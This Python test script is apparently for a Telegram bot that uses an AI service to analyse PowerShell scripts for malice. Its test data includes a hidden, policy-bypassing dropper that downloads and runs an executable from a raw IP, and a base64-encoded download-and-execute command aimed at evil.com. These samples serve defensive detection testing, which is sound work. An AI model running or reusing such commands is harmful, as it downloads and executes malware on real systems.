"""
Test script for Phase 1 - tests core functionality without Telegram.

Usage:
    1. Create .env file with your GROQ_API_KEY
    2. Run: python test_phase1.py
"""
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

from config import GROQ_API_KEY
from ai.groq import GroqClient
from core.analyzer import analyze_script
from core.extractor import extract_all, detect_script_type
from core.obfuscation import detect_obfuscation
from bot.formatter import format_analysis


# Test scripts from PLAN.md
BENIGN_SCRIPT = """
$UpdateSession = New-Object -ComObject Microsoft.Update.Session
$UpdateSearcher = $UpdateSession.CreateUpdateSearcher()
$SearchResult = $UpdateSearcher.Search("IsInstalled=0")
Write-Host "Updates available: $($SearchResult.Updates.Count)"
"""

MALICIOUS_SCRIPT = """
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
  $url = 'http://185.220.101.47/payload.exe';
  $path = $env:TEMP + '\\svchost32.exe';
  (New-Object System.Net.WebClient).DownloadFile($url, $path);
  Start-Process $path
"
"""

OBFUSCATED_SCRIPT = """
$encoded = 'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5jb20vcGF5bG9hZCcpCg=='
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)) | IEX
"""

AMBIGUOUS_SCRIPT = """
$url = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe"
$output = "$env:TEMP\\python_installer.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output -Args "/quiet InstallAllUsers=1" -Wait
"""


async def test_script(name: str, script: str, groq_client: GroqClient):
    """Test a single script."""
    print(f"\n{'='*60}")
    print(f"Testing: {name}")
    print(f"{'='*60}\n")
    
    # Test extraction
    extracted = extract_all(script)
    script_type = detect_script_type(script)
    print(f"Script Type: {script_type}")
    print(f"URLs found: {len(extracted['urls'])}")
    print(f"IPs found: {len(extracted['ips'])}")
    print(f"Hashes found: {len(extracted['hashes'])}")

    # Test obfuscation detection
    obfuscation = detect_obfuscation(script)
    print(f"Obfuscation detected: {obfuscation['obfuscation_detected']}")
    if obfuscation['flags']:
        for flag in obfuscation['flags'][:3]:
            print(f"   - {flag['name']}")

    # Test AI analysis
    print("\nRunning AI analysis (Groq)...")
    try:
        from core.analyzer import AnalysisResult
        from ai.prompts import SYSTEM_PROMPT, build_user_prompt

        obfuscation_flags = [flag["name"] for flag in obfuscation["flags"]]
        ai_analysis = await groq_client.analyze(script, {}, obfuscation_flags)

        result = AnalysisResult(
            script_hash="test",
            script_type=script_type,
            ai_analysis=ai_analysis,
            obfuscation=obfuscation,
            extracted=extracted,
        )

        print(f"\nAnalysis Complete!")
        print(f"\nRisk Level: {result.risk_level}")
        print(f"Confidence: {result.ai_analysis.get('confidence', 'N/A')}")
        print(f"\nSummary:")
        print(f"   {result.summary}")
        print(f"\nVerdict:")
        print(f"   {result.verdict}")

        print(f"\nFormatted Telegram Message:")
        print(f"{'-'*40}")
        formatted = format_analysis(result)
        print(formatted)

    except Exception as e:
        print(f"Analysis failed: {e}")
        import traceback
        traceback.print_exc()

    print(f"\n{'='*60}\n")


async def main():
    """Run all tests."""
    print("Dissect - Phase 1 Test Suite (Groq)\n")

    if not GROQ_API_KEY:
        print("Error: GROQ_API_KEY not set in .env file")
        print("   Create a .env file with your Groq API key")
        print("   Get one at: https://console.groq.com/keys")
        return

    groq_client = GroqClient(GROQ_API_KEY)
    print("Groq client initialized\n")

    await test_script("Benign (Windows Update Checker)", BENIGN_SCRIPT, groq_client)
    await test_script("Malicious (Dropper)", MALICIOUS_SCRIPT, groq_client)
    await test_script("Obfuscated (Base64 Payload)", OBFUSCATED_SCRIPT, groq_client)
    await test_script("Ambiguous (Legitimate Installer)", AMBIGUOUS_SCRIPT, groq_client)

    print("\nAll tests completed!")


if __name__ == "__main__":
    asyncio.run(main())
